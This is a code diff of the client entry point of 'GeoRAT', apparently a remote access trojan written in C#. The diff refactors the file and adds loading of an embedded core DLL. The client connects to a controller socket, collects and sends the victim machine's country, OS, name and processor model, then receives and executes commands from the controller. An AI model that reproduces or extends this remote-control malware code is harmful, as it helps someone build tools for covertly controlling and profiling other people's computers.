@@ -1,17 +1,16 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
+using System.Reflection;
 using Client;
 using Cliet;
 using GeoRAT.Client.CommandHandlers;
-using GeoRAT.Client.Compressor;
 using GeoRAT.Client.Network;
-using GeoRAT.Client.PacketStruct;
-using GeoRAT.Client.PacketStruct.PacketStruct;
+using GeoRAT.Client.Runtime;
+using GeoRAT.Core.Commands;
+using GeoRAT.Core.Compressor;
+using GeoRAT.Core.PacketStruct;
+
 
 namespace GeoRAT.Client
 {
@@ -24,11 +23,32 @@ namespace GeoRAT.Client
             ClientNetwork network = new ClientNetwork("127.0.0.1", 9150);
             network.OnConnected += OnConnected;
             network.BeginConnect();
+            //Load core .DLL
+            LoadLibrary();
             Process.GetCurrentProcess().WaitForExit();
+            
 
         }
 
+        #region LoadLibraries
+
+        static void LoadLibrary()
+        {
+            var dll = "GeoRAT.Client.Libraries.GeoRAT.Core.dll";
+            EmbeddedAssembly.Load(dll, "GeoRAT.Client.Libraries.GeoRAT.Core.dll");
+            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);
+        }
+        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
+        {
+            return EmbeddedAssembly.Get(args.Name);
+        }
+
+
+        #endregion
         //When connected to server 
+
+        #region Connection
+
         static void OnConnected(Socket s)
         {
             Console.WriteLine("Connected to {0}", s.RemoteEndPoint.ToString());
@@ -39,19 +59,23 @@ namespace GeoRAT.Client
             reader.OnReceived += HandleCommand;
 
             Serializer ser = new Serializer();
-  
-            Info i = new Info(GetInfo.GetCountry(), GetInfo.GetOS(), GetInfo.Name(), GetInfo.GetProcessorModel()); //Geenerate Info object 
+
+            Info i = new Info(GetInfo.GetCountry(), GetInfo.GetOS(), GetInfo.Name(),
+                GetInfo.GetProcessorModel()); //Geenerate Info object 
             var buf = ser.Serialize(i);
             var cmp = Compression.Compress(buf); //Compress data using GZIP 
             var len = cmp.Length;
             var sendLen = BitConverter.GetBytes(len);
-            reader.Send(sendLen);//Send data length
+            reader.Send(sendLen); //Send data length
             reader.Send(cmp); //Send data itself 
 
 
         }
 
-        //If sock is disconnected clean it 
+        #endregion
+
+        #region Disconnection
+
         static void OnDisconnectedHandler(Socket socket)
         {
             socket.Close();
@@ -59,8 +83,13 @@ namespace GeoRAT.Client
             Process.GetCurrentProcess().Kill();
         }
 
-        //When received command, deserialize it, then pass to commandhandler static class function which will decide what to do next 
-        static void HandleCommand( byte[] buf, int size)
+
+
+
+        #endregion
+
+        #region Commands
+        static void HandleCommand(byte[] buf, int size)
         {
 
             Commands k = new Commands();
@@ -71,5 +100,8 @@ namespace GeoRAT.Client
             Console.WriteLine("Got new data, length {0} bytes", size);
             handler.Handle(k);
         }
+
+        #endregion
+
     }
 }
